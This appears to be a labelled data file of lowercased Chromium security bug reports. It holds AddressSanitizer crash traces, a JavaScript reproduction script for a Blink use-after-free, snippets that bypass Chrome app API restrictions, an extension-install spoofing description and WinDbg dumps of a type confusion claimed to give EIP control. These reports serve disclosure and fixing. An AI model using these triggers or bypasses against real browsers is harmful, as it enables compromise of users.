blink collectchildrenandremovefromoldparent blink node wtf vector wtf refptr blink node 11ul wtf partitionallocator blink exceptionstate third_party/webkit/source/core/dom/containernode.cpp:75:9 8 in blink containernode appendchild wtf passrefptr blink node blink exceptionstate third_party/webkit/source/core/dom/containernode.cpp:735:5 9 in blink node appendchild wtf passrefptr blink node blink exceptionstate third_party/webkit/source/core/dom/node.cpp:482:16 10 in appendchildmethodformainworld mnt/data/b/build/slave/asan_release/build/src/out/release/gen/blink/bindings/core/v8/v8node.cpp:715:39 11 in blink nodev8internal appendchildmethodcallbackformainworld v8 functioncallbackinfo v8 value const mnt/data/b/build/slave/asan_release/build/src/out/release/gen/blink/bindings/core/v8/v8node.cpp:726 12 in v8 internal functioncallbackarguments call void v8 functioncallbackinfo v8 value const v8/src/arguments.cc:33:3 13 in v8 internal maybehandle v8 internal object v8 internal handleapicallhelper false v8 internal isolate v8 internal anonymous namespace builtinarguments v8 internal builtinextraarguments 1 v8/src/builtins.cc:1842:34 14 in builtin_implhandleapicall v8/src/builtins.cc:1865:3 15 in v8 internal builtin_handleapicall int v8 internal object v8 internal isolate v8/src/builtins.cc:1861 16 unknown module 17 unknown module 18 unknown module 19 unknown module 20 in v8 internal anonymous namespace invoke v8 internal isolate bool v8 internal handle v8 internal object v8 internal handle v8 internal object int v8 internal handle v8 internal object v8 internal handle v8 internal object v8/src/execution.cc:98:13 21 in v8 internal execution call v8 internal isolate v8 internal handle v8 internal object v8 internal handle v8 internal object int v8 internal handle v8 internal object v8/src/execution.cc:167:10 22 in v8 function call v8 local v8 context v8 local v8 value int v8 local v8 value v8/src/api.cc:4401:7 23 in blink v8scriptrunner callfunction v8 local v8 function blink executioncontext v8 local v8 value int v8 local v8 value v8 isolate third_party/webkit/source/bindings/core/v8/v8scriptrunner.cpp:441:40 24 in callfunction third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:159:40 25 in blink scriptcontroller callfunction v8 local v8 function v8 local v8 value int v8 local v8 value third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:154 26 in blink scheduledaction execute blink localframe third_party/webkit/source/bindings/core/v8/scheduledaction.cpp:120:9 27 in blink scheduledaction execute blink executioncontext third_party/webkit/source/bindings/core/v8/scheduledaction.cpp:81:9 28 in blink domtimer fired third_party/webkit/source/core/frame/domtimer.cpp:148:5 29 in blink timerbase runinternal third_party/webkit/source/platform/timer.cpp:139:5 30 in blink timerbase cancellabletimertask run third_party/webkit/source/platform/timer.h:109:17 31 in run base/bind_internal.h:157:12 32 in makeitso base/bind_internal.h:293 33 in base internal invoker base indexsequence 0ul base internal bindstate base internal runnableadapter void scoped_ptr blink webtaskrunner task base defaultdeleter blink webtaskrunner task void scoped_ptr blink webtaskrunner task base defaultdeleter blink webtaskrunner task base internal typelist base internal passedwrapper scoped_ptr blink webtaskrunner task base defaultdeleter blink webtaskrunner task base internal typelist base internal unwraptraits base internal passedwrapper scoped_ptr blink webtaskrunner task base defaultdeleter blink webtaskrunner task base internal invokehelper false void base internal runnableadapter void scoped_ptr blink webtaskrunner task base defaultdeleter blink webtaskrunner task base internal typelist scoped_ptr blink webtaskrunner task base defaultdeleter blink webtaskrunner task void run base internal bindstatebase base/bind_internal.h:343 34 in run base/callback.h:396:12 35 in base debug taskannotator runtask char const base pendingtask const base/debug/task_annotator.cc:51 36 in scheduler taskqueuemanager processtaskfromworkqueue scheduler internal taskqueueimpl scheduler internal taskqueueimpl task components/scheduler/base/task_queue_manager.cc:357:3 37 in scheduler taskqueuemanager dowork bool components/scheduler/base/task_queue_manager.cc:282:13 38 in run base/bind_internal.h:176:12 39 in makeitso base/bind_internal.h:303 40 in base internal invoker base indexsequence 0ul 1ul base internal bindstate base internal runnableadapter void scheduler taskqueuemanager bool void scheduler taskqueuemanager bool base internal typelist base weakptr scheduler taskqueuemanager bool base internal typelist base internal unwraptraits base weakptr scheduler taskqueuemanager base internal unwraptraits bool base internal invokehelper true void base internal runnableadapter void scheduler taskqueuemanager bool base internal typelist base weakptr scheduler taskqueuemanager const bool const void run base internal bindstatebase base/bind_internal.h:343 previously allocated by thread t0 content_shell here 0 in interceptor_malloc home/nils/fuzzer3/runner/asan-linux-release-359663/content_shell 1 in partitionallocgenericflags third_party/webkit/source/wtf/partitionalloc.h:738:20 2 in partitionallocgeneric third_party/webkit/source/wtf/partitionalloc.h:762 3 in fastmalloc third_party/webkit/source/wtf/partitions.h:108 4 in operator new third_party/webkit/source/wtf/refcounted.h:166 5 in blink cssstylesheet createinline blink node blink kurl const wtf textposition const wtf string const third_party/webkit/source/core/css/cssstylesheet.cpp:113 6 in blink styleengine parsesheet blink element wtf string const wtf textposition third_party/webkit/source/core/dom/styleengine.cpp:573:18 7 in blink styleengine createsheet blink element wtf string const wtf textposition third_party/webkit/source/core/dom/styleengine.cpp:552:22 8 in blink styleelement createsheet blink element wtf string const third_party/webkit/source/core/dom/styleelement.cpp:199:24 9 in process third_party/webkit/source/core/dom/styleelement.cpp:146:12 10 in blink styleelement processstylesheet blink document blink element third_party/webkit/source/core/dom/styleelement.cpp:76 11 in blink htmlstyleelement didnotifysubtreeinsertionstodocument third_party/webkit/source/core/html/htmlstyleelement.cpp:101:9 12 in blink containernode notifynodeinserted blink node blink containernode childrenchangesource third_party/webkit/source/core/dom/containernode.cpp:828:13 13 in blink containernode updatetreeafterinsertion blink node third_party/webkit/source/core/dom/containernode.cpp:1280:5 14 in blink containernode appendchild wtf passrefptr blink node blink exceptionstate third_party/webkit/source/core/dom/containernode.cpp:771:9 15 in blink node appendchild wtf passrefptr blink node blink exceptionstate third_party/webkit/source/core/dom/node.cpp:482:16 16 in appendchildmethodformainworld mnt/data/b/build/slave/asan_release/build/src/out/release/gen/blink/bindings/core/v8/v8node.cpp:715:39 17 in blink nodev8internal appendchildmethodcallbackformainworld v8 functioncallbackinfo v8 value const mnt/data/b/build/slave/asan_release/build/src/out/release/gen/blink/bindings/core/v8/v8node.cpp:726 18 in v8 internal functioncallbackarguments call void v8 functioncallbackinfo v8 value const v8/src/arguments.cc:33:3 19 in v8 internal maybehandle v8 internal object v8 internal handleapicallhelper false v8 internal isolate v8 internal anonymous namespace builtinarguments v8 internal builtinextraarguments 1 v8/src/builtins.cc:1842:34 20 in builtin_implhandleapicall v8/src/builtins.cc:1865:3 21 in v8 internal builtin_handleapicall int v8 internal object v8 internal isolate v8/src/builtins.cc:1861 22 unknown module 23 unknown module 24 unknown module 25 unknown module 26 in v8 internal anonymous namespace invoke v8 internal isolate bool v8 internal handle v8 internal object v8 internal handle v8 internal object int v8 internal handle v8 internal object v8 internal handle v8 internal object v8/src/execution.cc:98:13 27 in v8 internal execution call v8 internal isolate v8 internal handle v8 internal object v8 internal handle v8 internal object int v8 internal handle v8 internal object v8/src/execution.cc:167:10 28 in v8 function call v8 local v8 context v8 local v8 value int v8 local v8 value v8/src/api.cc:4401:7 29 in blink v8scriptrunner callfunction v8 local v8 function blink executioncontext v8 local v8 value int v8 local v8 value v8 isolate third_party/webkit/source/bindings/core/v8/v8scriptrunner.cpp:441:40 30 in callfunction third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:159:40 31 in blink scriptcontroller callfunction v8 local v8 function v8 local v8 value int v8 local v8 value third_party/webkit/source/bindings/core/v8/scriptcontroller.cpp:154 32 in blink scheduledaction execute blink localframe third_party/webkit/source/bindings/core/v8/scheduledaction.cpp:120:9 33 in blink scheduledaction execute blink executioncontext third_party/webkit/source/bindings/core/v8/scheduledaction.cpp:81:9 34 in blink domtimer fired third_party/webkit/source/core/frame/domtimer.cpp:148:5 35 in blink timerbase runinternal third_party/webkit/source/platform/timer.cpp:139:5 36 in blink timerbase cancellabletimertask run third_party/webkit/source/platform/timer.h:109:17 37 in run base/bind_internal.h:157:12 38 in makeitso base/bind_internal.h:293 39 in base internal invoker base indexsequence 0ul base internal bindstate base internal runnableadapter void scoped_ptr blink webtaskrunner task base defaultdeleter blink webtaskrunner task void scoped_ptr blink webtaskrunner task base defaultdeleter blink webtaskrunner task base internal typelist base internal passedwrapper scoped_ptr blink webtaskrunner task base defaultdeleter blink webtaskrunner task base internal typelist base internal unwraptraits base internal passedwrapper scoped_ptr blink webtaskrunner task base defaultdeleter blink webtaskrunner task base internal invokehelper false void base internal runnableadapter void scoped_ptr blink webtaskrunner task base defaultdeleter blink webtaskrunner task base internal typelist scoped_ptr blink webtaskrunner task base defaultdeleter blink webtaskrunner task void run base internal bindstatebase base/bind_internal.h:343 summary addresssanitizer heap-use-after-free third_party/webkit/source/wtf/refptr.h:60:43 in get shadow bytes around the buggy address 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 container overflow fc array cookie ac intra object redzone bb asan internal fe left alloca redzone ca right alloca redzone cb 389==aborting version chrome version asan-linux-release-359663 operating system linux 64-bit reproduction case script function start o0=window.document o3=o0.implementation.createdocument o5=o3.queryselector not id o9=o0.createelementns o9.id='id2 o0.documentelement.appendchild o9 o11=document.createelementns o3.documentelement.appendchild o11 document.documentelement.appendchild o5 o11.innerhtml=unescape style delete o9 o36=o0.createelement menu o47=document.createelementns document.documentelement.appendchild o36 o54=o36 createshadowroot undefined undefined undefined 1 o63=o0.getelementbyid id2 o54.appendchild o63 window.top.settimeout timeout_23 function timeout_23 o47.innerhtml=unescape style o72=o0.createelement figure o63.appendchild o47 o72.appendchild o47 start script for crashes please include the following additional information type of crash tab	7
heap-use-after-free in loadwatcher callbackanddie chrome.app.window.create chrome version 48.0.2564.103 stable and earlier and 50.0.2633.0 head extensions loadwatcher callbackanddie is called when didcreatedocumentelement is triggered callbackanddie calls a user-defined javascript function and then deletes the loadwatcher instance javascript code can easily replace the document e.g via document.close/write didcreatedocumentelement is triggered whenever a document is created/replaced the loadwatcher instance user-defined callback code is instantiated by the chrome.app.window.create app method all together this means that malicious chrome apps can cause callbackanddie to be called re-entrantly when the callback of chrome.apps.window.create replaces the document of the new app window which results in a use-after-free and double-frees see the attached app manifest.json and background.js and the stack trace generated with asan the head of the trace is repeated a couple of times which shows that the poc was able to trigger callbackanddie multiple times at one run 10==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 chrome 0 in callbackanddie extensions/renderer/render_frame_observer_natives.cc:54:5 1 in didcreatedocumentelement content/renderer/render_frame_impl.cc:3351:7 2 in documentelementavailable third_party/webkit/source/web/frameloaderclientimpl.cpp:181:9 3 in dispatchdocumentelementavailableifneeded third_party/webkit/source/core/html/parser/htmlconstructionsite.cpp:387:9 4 in inserthtmlhtmlstarttagbeforehtml third_party/webkit/source/core/html/parser/htmlconstructionsite.cpp:401:0 5 in defaultforbeforehtml third_party/webkit/source/core/html/parser/htmltreebuilder.cpp:2536:5 6 in processcharacterbuffer third_party/webkit/source/core/html/parser/htmltreebuilder.cpp:2295:0 7 in processcharacter third_party/webkit/source/core/html/parser/htmltreebuilder.cpp:2257:5 8 in processtoken third_party/webkit/source/core/html/parser/htmltreebuilder.cpp:404:0 9 in constructtree third_party/webkit/source/core/html/parser/htmltreebuilder.cpp:382:9 10 in constructtreefromhtmltoken third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:719:5 11 in pumptokenizer third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:664:9 12 in pumptokenizerifpossible third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:302:5 13 in insert third_party/webkit/source/core/html/parser/htmldocumentparser.cpp:768:0 14 in write third_party/webkit/source/core/dom/document.cpp:2877:5 15 in write third_party/webkit/source/core/dom/document.cpp:2882:5 16 in write third_party/webkit/source/core/dom/document.cpp:2899:5 17 in writemethod cr/src/out_asan/release/gen/blink/bindings/core/v8/v8document.cpp:4598:5 18 in writemethodcallback cr/src/out_asan/release/gen/blink/bindings/core/v8/v8document.cpp:4608:0 19 in call v8/src/arguments.cc:33:3 20 in handleapicallhelper false v8/src/builtins.cc:3580:34 21 in builtin_impl_handleapicall v8/src/builtins.cc:3604:3 22 in builtin_handleapicall v8/src/builtins.cc:3601:0	11
crash in sksweepgradient sweepgradientcontext shadespan vulnerability details the testcase crashes 64 bit filter_fuzz_stub looks the same as 23208==error addresssanitizer segv on unknown address pc bp sp t0 0 in sksweepgradient sweepgradientcontext shadespan int int unsigned int int third_party/skia/src/effects/gradients/sksweepgradient.cpp:113:23 1 in skargb32_shader_blitter blitrect int int int int third_party/skia/src/core/skblitter_argb32.cpp:448:17 2 in blitrect third_party/skia/src/core/skscan.cpp:15:5 3 in skscan fillirect skirect const skregion const skblitter third_party/skia/src/core/skscan.cpp:43 4 in fillrect third_party/skia/src/core/skscan.cpp:61:5 5 in skscan fillrect skrect const skrasterclip const skblitter third_party/skia/src/core/skscan.cpp:103 6 in skdraw drawrect skrect const skpaint const skmatrix const skrect const const third_party/skia/src/core/skdraw.cpp:872:21 7 in skcanvas ondrawrect skrect const skpaint const third_party/skia/src/core/skcanvas.cpp:2031:9 8 in skrectshaderimagefilter onfilterimage skimagefilter proxy skbitmap const skimagefilter context const skbitmap skipoint const third_party/skia/src/effects/skrectshaderimagefilter.cpp:74:5 9 in skimagefilter filterimage skimagefilter proxy skbitmap const skimagefilter context const skbitmap skipoint const third_party/skia/src/core/skimagefilter.cpp:250:9 10 in skcanvas internaldrawdevice skbasedevice int int skpaint const bool third_party/skia/src/core/skcanvas.cpp:1341:17 11 in skcanvas internalrestore third_party/skia/src/core/skcanvas.cpp:1187:13 12 in autodrawlooper autodrawlooper third_party/skia/src/core/skcanvas.cpp:479:13 13 in skcanvas internaldrawbitmap skbitmap const skmatrix const skpaint const third_party/skia/src/core/skcanvas.cpp:1316:1 14 in skcanvas ondrawbitmap skbitmap const float float skpaint const third_party/skia/src/core/skcanvas.cpp:2215:5 15 in runtestcase skia/tools/filter_fuzz_stub/filter_fuzz_stub.cc:47:5 16 in readandruntestcase skia/tools/filter_fuzz_stub/filter_fuzz_stub.cc:66 17 in main skia/tools/filter_fuzz_stub/filter_fuzz_stub.cc:85 18 in libc_start_main build/buildd/eglibc-2.19/csu/libc-start.c:287 addresssanitizer can not provide additional info summary addresssanitizer segv third_party/skia/src/effects/gradients/sksweepgradient.cpp:113:23 in sksweepgradient sweepgradientcontext shadespan int int unsigned int int version chrome version asan-linux-stable-46.0.2490.86 operating system ubuntu 64 reproduction case attached file	11
restricted web apis can easily be accessed from chrome apps chrome version 48.0.2564.103 stable and earlier and 50.0.2633.0 head some web platform apis are disabled in chrome apps for security reasons this is implemented in platform_app.js 1 these restrictions can be bypassed i the restriction of document.open/write/writeln/close is implemented by shadowing htmldocument.prototype.write but document.prototype.write should be shadowed instead so either of the following two ways allows the use of the restricted api delete htmldocument.prototype.write document.prototype.write.call document ii window.onbeforeunload is shadowed by object.defineproperty with configurable true this allows the property descriptor to be removed via the delete operator delete window.onbeforeunload remove restriction window.onbeforeunload function return this should not be visible poc for i see issue 585268 document.write/close was used for that exploit poc for ii 1 download manifest.json and background.js 2 load the app either via chrome extensions or by uploading it to the chrome web store and installing it 3 the app uses the above trick and then calls location.reload to show a poc expected result window.onbeforeunload is not available in packaged apps error in console actual result upon unload a dialog shows up 1	2
unknown in extensions webrtcaudioprivatefunction calculatehmacimpl chrome version stable 47.0.2526.106 m operating system windows 7 type of crash browser crash id 37321703cbf38db9 i do n't have specific steps to repro this crash but sometimes i can reproduce it but i do n't know what are the steps i took this crash happened when i used a new incognito window and i opened gmail then i closed the incognito window eax=05c4f7f8 ebx=21f58d50 ecx=2449acc0 edx=674e0ccd esi=05c4f8a0 edi=11cb06d0 eip=756e4500 esp=05c4f7dc ebp=05c4f868 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010246 756e4500 0:013 k stack trace for last set context thread/.cxr resets it childebp retaddr warning frame ip not in any known module following frames may be wrong 05c4f7d8 672b388c 05c4f868 672b41f7 chrome_65bc0000 extensions webrtcaudioprivatefunction calculatehmacimpl c b\build\slave\win\build\src\chrome\browser\extensions\api\webrtc_audio_private\webrtc_audio_private_api.cc 207 05c4f8bc 672b4469 chrome_65bc0000 extensions webrtcaudioprivategetsinksfunction onoutputdevicenames c b\build\slave\win\build\src\chrome\browser\extensions\api\webrtc_audio_private\webrtc_audio_private_api.cc 237 05c4f8cc 672b3de7 chrome_65bc0000 base internal runnableadapter void thiscall extensions webrtcaudioprivatefunction scoped_ptr std list media audiodevicename std allocator media audiodevicename base defaultdeleter std list media audiodevicename std allocator media audiodevicename run c b\build\slave\win\build\src\base\bind_internal.h 176 05c4f8dc 672b4448 chrome_65bc0000 base internal invokehelper 0 void base internal runnableadapter void thiscall extensions webrtcaudioprivatefunction scoped_ptr std list media audiodevicename std allocator media audiodevicename base defaultdeleter std list media audiodevicename std allocator media audiodevicename base internal typelist extensions webrtcaudioprivatefunction const scoped_ptr std list media audiodevicename std allocator media audiodevicename base defaultdeleter std list media audiodevicename std allocator media audiodevicename makeitso c b\build\slave\win\build\src\base\bind_internal.h 294 05c4f8fc 65c1e84e chrome_65bc0000 base internal invoker base indexsequence 0,1 base internal bindstate base internal runnableadapter void thiscall extensions webrtcaudioprivatefunction scoped_ptr std list media audiodevicename std allocator media audiodevicename base defaultdeleter std list media audiodevicename std allocator media audiodevicename void cdecl extensions webrtcaudioprivatefunction scoped_ptr std list media audiodevicename std allocator media audiodevicename base defaultdeleter std list media audiodevicename std allocator media audiodevicename base internal typelist extensions webrtcaudioprivatefunction base internal passedwrapper scoped_ptr std list media audiodevicename std allocator media audiodevicename base defaultdeleter std list media audiodevicename std allocator media audiodevicename base internal typelist base internal unwraptraits extensions webrtcaudioprivatefunction base internal unwraptraits base internal passedwrapper scoped_ptr std list media audiodevicename std allocator media audiodevicename base defaultdeleter std list media audiodevicename std allocator media audiodevicename base internal invokehelper 0 void base internal runnableadapter void thiscall extensions webrtcaudioprivatefunction scoped_ptr std list media audiodevicename std allocator media audiodevicename base defaultdeleter std list media audiodevicename std allocator media audiodevicename base internal typelist extensions webrtcaudioprivatefunction const scoped_ptr std list media audiodevicename std allocator media audiodevicename base defaultdeleter std list media audiodevicename std allocator media audiodevicename void cdecl void run c b\build\slave\win\build\src\base\bind_internal.h 346 05c4f960 65c1e630 chrome_65bc0000 base debug taskannotator runtask c b\build\slave\win\build\src\base\debug\task_annotator.cc 51 05c4f9cc 65c1e042 chrome_65bc0000 base messageloop runtask c b\build\slave\win\build\src\base\message_loop\message_loop.cc 483 05c4fb00 65c1dbb8 chrome_65bc0000 base messageloop dowork c b\build\slave\win\build\src\base\message_loop\message_loop.cc 603 05c4fb14 65c1dadd chrome_65bc0000 base messagepumpforio dorunloop c b\build\slave\win\build\src\base\message_loop\message_pump_win.cc 496 error symbol file could not be found defaulted to export symbols for ole32.dll 05c4fbec 76e9eb4d chrome_65bc0000 base messageloop starthistogrammer c b\build\slave\win\build\src\base\message_loop\message_loop.cc 572 05c4fc18 65bc1a3d ole32 cotaskmemalloc 05c4fc2c 65bc1a14 chrome_65bc0000 anonymous namespace win_heap_malloc c b\build\slave\win\build\src\base\allocator\allocator_shim_win.cc 58 05c4fc3c 65bc38af chrome_65bc0000 malloc c b\build\slave\win\build\src\base\allocator\allocator_shim_win.cc 165 05c4fc4c 67ac326c chrome_65bc0000 anonymous namespace generic_cpp_alloc c b\build\slave\win\build\src\base\allocator\allocator_shim_win.cc 102 05c4fc60 65be4d1b chrome_65bc0000 content anonymous namespace g_globals 05c4fc94 65c1a4ba chrome_65bc0000 base messageloop current c b\build\slave\win\build\src\base\message_loop\message_loop.cc 186 05c4fcd0 65c1a29e chrome_65bc0000 base thread threadmain c b\build\slave\win\build\src\base\threading\thread.cc 254 05c4fcf0 76643c45 chrome_65bc0000 base anonymous namespace threadfunc c b\build\slave\win\build\src\base\threading\platform_thread_win.cc 84 05c4fcfc 77c637f5 kernel32 basethreadinitthunk	11
security inline extension installation dialog does n't block and persists after redirect vulnerability details this vulnerability makes it possible to display an inline extension installation dialog on a different origin that initiated the install thus tricking the user into installing an extension as if it was from that origin as the dialog does n't show the origin it gives even more credibility to the attack version chrome version 46.0.2490.80 m stable reproduction case 1 download index.html 2 change de id of the extension to your extension s id 3 open index.html and click on the link given i do n't have an extension capable of inline installation i ca n't set up a page for this poc but you can download the poc and test it yourself if you have an extension here is a video simulating the attack	2
heap-use-after-free in favicon favicondriverimpl diddownloadfavicon detailed report fuzzer attekett_surku_fuzzer job type linux_lsan_chrome_mp platform id linux crash type heap-use-after-free read 8 crash address crash state favicon favicondriverimpl diddownloadfavicon base debug taskannotator runtask base messageloop runtask unminimized testcase additional requirements requires gestures filer ochang see for more information	11
security type confusion in blink basebuttoninputtype valueattributechanged vulnerability details the attached testcase crash.svg triggers a type confusion in blink basebuttoninputtype valueattributechanged which can be exploited to get fairly reliable control of eip on the 32-bit version of chrome on windows 10 a poc is attached as poc.html crash.svg which triggers the following crash on windows if successful which it is in most cases for me the poc was loaded from a local web server chrome on windows 10 version 48.0.2564.116 m stack chrome_child blink containernode attachchildren chrome_child blink containernode attach chrome_child blink element attach chrome_child blink htmlformcontrolelement attach chrome_child blink htmlinputelement attach chrome_child blink node reattach chrome_child blink element recalcownstyle chrome_child blink element recalcstyle chrome_child blink containernode recalcchildstyle chrome_child blink element recalcstyle chrome_child blink document updatestyle chrome_child blink document updatelayouttree chrome_child blink document updatelayouttreeifneeded chrome_child blink frameview updatestyleandlayoutifneededrecursive chrome_child blink frameview updatestyleandlayoutifneededrecursive chrome_child blink frameview updatelifecyclephasesinternal chrome_child blink frameview updatelifecycletocompositingcleanplusscrolling chrome_child blink pageanimator updatelifecycletocompositingcleanplusscrolling chrome_child blink pagewidgetdelegate updatelifecycletocompositingcleanplusscrolling chrome_child blink webviewimpl updatealllifecyclephases windbg 1170.23d8 access violation code c0000005 first chance first chance exceptions are reported before any exception handling this exception may be expected and handled chrome_child blink containernode attachchildren 5dd058e9 ff90c4000000 call dword ptr eax+0c4h ds:002b beefbeef 0:000 x86 dd 24242424 dead0000 dead0001 dead0002 dead0003 24242434 dead0004 dead0005 dead0006 dead0007 24242444 24242454 dead0009 dead000a dead000b 24242454 beefbe2b dead000d dead000e dead000f 24242464 00180000 00000000 00000000 00000000 24242474 00000000 00000000 00000000 00000000 24242484 00000000 00000000 00000000 00000000 24242494 00000000 00000000 00000000 00000000 0:000 x86 r eax=beefbe2b ebx=0018eba8 ecx=24242454 edx=0018eba8 esi=24242454 edi=00000000 eip=5dd058e9 esp=0018eb44 ebp=0018eb5c iopl=0 nv up ei pl zr na pe nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010246 chrome_child blink containernode attachchildren 5dd058e9 ff90c4000000 call dword ptr eax+0c4h ds:002b beefbeef assembly 5dd058d2 8b4610 mov eax dword ptr esi+10h 5dd058d5 2500001800 and eax,180000h 5dd058da 3d00001800 cmp eax,180000h 5dd058df 750e jne chrome_child blink containernode attachchildren 5dd058ef 5dd058e1 8b06 mov eax dword ptr esi 5dd058e3 8d4df4 lea ecx ebp-0ch 5dd058e6 51 push ecx 5dd058e7 8bce mov ecx esi 5dd058e9 ff90c4000000 call dword ptr eax+0c4h ds:002b beefbeef the latest asan build of chromium crashes on an assert_with_security_implication as follows assertion failed node node istextnode third_party/webkit/source/core/dom/text.h 86 blink text blink totext blink node 18239:18239:0225/151528:10605916812 info console 24 3 source file home/nils/monkeychrome/oprealestate/submission10/crash.svg 24 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 asan deadlysignal 18266==error addresssanitizer segv on unknown address pc bp sp t0 0 in totext third_party/webkit/source/core/dom/text.h:86:1 1 in blink basebuttoninputtype valueattributechanged third_party/webkit/source/core/html/forms/basebuttoninputtype.cpp:53 2 in blink imageinputtype valueattributechanged third_party/webkit/source/core/html/forms/imageinputtype.cpp:152:5 3 in blink htmlinputelement parseattribute blink qualifiedname const wtf atomicstring const wtf atomicstring const third_party/webkit/source/core/html/htmlinputelement.cpp:710:9 4 in blink element attributechanged blink qualifiedname const wtf atomicstring const wtf atomicstring const blink element attributemodificationreason third_party/webkit/source/core/dom/element.cpp:1156:5 5 in blink element didaddattribute blink qualifiedname const wtf atomicstring const third_party/webkit/source/core/dom/element.cpp:3118:5 6 in appendattributeinternal third_party/webkit/source/core/dom/element.cpp:2256:9 7 in setattributeinternal third_party/webkit/source/core/dom/element.cpp:1124 8 in blink element setattribute blink qualifiedname const wtf atomicstring const third_party/webkit/source/core/dom/element.cpp:1106 9 in blink basebuttoninputtype setvalue wtf string const bool blink textfieldeventbehavior third_party/webkit/source/core/html/forms/basebuttoninputtype.cpp:82:5 10 in blink htmlinputelement setvalue wtf string const blink textfieldeventbehavior third_party/webkit/source/core/html/htmlinputelement.cpp:1084:5 11 in blink htmlinputelement setvalue wtf string const blink exceptionstate blink textfieldeventbehavior third_party/webkit/source/core/html/htmlinputelement.cpp:1066:5 12 in valueattributesetter mnt/data/b/build/slave/asan_release/build/src/out/release/gen/blink/bindings/core/v8/v8htmlinputelement.cpp:1057:5 13 in blink htmlinputelementv8internal valueattributesettercallback v8 functioncallbackinfo v8 value const mnt/data/b/build/slave/asan_release/build/src/out/release/gen/blink/bindings/core/v8/v8htmlinputelement.cpp:1065 14 in v8 internal functioncallbackarguments call void v8 functioncallbackinfo v8 value const v8/src/arguments.cc:33:3 15 in v8 internal maybehandle v8 internal object v8 internal anonymous namespace handleapicallhelper false v8 internal isolate v8 internal anonymous namespace builtinarguments v8 internal builtinextraarguments 1 v8/src/builtins.cc:3803:34 16 in v8 internal builtins invokeapifunction v8 internal handle v8 internal heapobject v8 internal handle v8 internal object int v8 internal handle v8 internal object v8/src/builtins.cc:3952:14 17 in v8 internal object setpropertywithaccessor v8 internal lookupiterator v8 internal handle v8 internal object v8 internal object shouldthrow v8/src/objects.cc:1252:9 18 in v8 internal object setpropertyinternal v8 internal lookupiterator v8 internal handle v8 internal object v8 internal languagemode v8 internal object storefromkeyed bool v8/src/objects.cc:4153:16 19 in v8 internal object setproperty v8 internal lookupiterator v8 internal handle v8 internal object v8 internal languagemode v8 internal object storefromkeyed v8/src/objects.cc:4202:7 20 in v8 internal storeic store v8 internal handle v8 internal object v8 internal handle v8 internal name v8 internal handle v8 internal object v8 internal object storefromkeyed v8/src/ic/ic.cc:1559:3 21 in rt_impl_runtime_storeic_miss v8/src/ic/ic.cc:2321:5 22 in v8 internal runtime_storeic_miss int v8 internal object v8 internal isolate v8/src/ic/ic.cc:2305 23 unknown module 24 unknown module 25 unknown module 26 unknown module 27 unknown module 28 in v8 internal anonymous namespace invoke v8 internal isolate bool v8 internal handle v8 internal object v8 internal handle v8 internal object int v8 internal handle v8 internal object v8 internal handle v8 internal object v8/src/execution.cc:97:13 29 in v8 internal execution call v8 internal isolate v8 internal handle v8 internal object v8 internal handle v8 internal object int v8 internal handle v8 internal object v8/src/execution.cc:163:10 30 in v8 function call v8 local v8 context v8 local v8 value int v8 local v8 value v8/src/api.cc:4388:7 31 in blink v8scriptrunner callfunction v8 local v8 function blink executioncontext v8 local v8 value int v8 local v8 value v8 isolate third_party/webkit/source/bindings/core/v8/v8scriptrunner.cpp:465:40 32 in blink v8eventlistener calllistenerfunction blink scriptstate v8 local v8 value blink event third_party/webkit/source/bindings/core/v8/v8eventlistener.cpp:94:10 33 in blink v8abstracteventlistener invokeeventhandler blink scriptstate blink event v8 local v8 value third_party/webkit/source/bindings/core/v8/v8abstracteventlistener.cpp:138:23 34 in blink v8abstracteventlistener handleevent blink scriptstate blink event third_party/webkit/source/bindings/core/v8/v8abstracteventlistener.cpp:99:5 35 in blink v8abstracteventlistener handleevent blink executioncontext blink event third_party/webkit/source/bindings/core/v8/v8abstracteventlistener.cpp:84:5 36 in blink eventtarget fireeventlisteners blink event blink eventtargetdata blink heapvector blink registeredeventlistener 1ul third_party/webkit/source/core/events/eventtarget.cpp:444:9 37 in blink eventtarget fireeventlisteners blink event third_party/webkit/source/core/events/eventtarget.cpp:368:9 38 in blink node handlelocalevents blink event third_party/webkit/source/core/dom/node.cpp:2030:5 39 in blink nodeeventcontext handlelocalevents blink event const third_party/webkit/source/core/events/nodeeventcontext.cpp:66:5 40 in dispatcheventattarget third_party/webkit/source/core/events/eventdispatcher.cpp:170:5 41 in blink eventdispatcher dispatch third_party/webkit/source/core/events/eventdispatcher.cpp:125 42 in blink eventdispatcher dispatchevent blink node wtf rawptr blink eventdispatchmediator third_party/webkit/source/core/events/eventdispatcher.cpp:49:12 43 in dispatchevent third_party/webkit/source/core/events/scopedeventqueue.cpp:82:5 44 in blink scopedeventqueue enqueueeventdispatchmediator wtf rawptr blink eventdispatchmediator third_party/webkit/source/core/events/scopedeventqueue.cpp:66 45 in blink eventdispatcher dispatchscopedevent blink node wtf rawptr blink eventdispatchmediator third_party/webkit/source/core/events/eventdispatcher.cpp:68:5 46 in blink node dispatchscopedevent wtf rawptr blink event 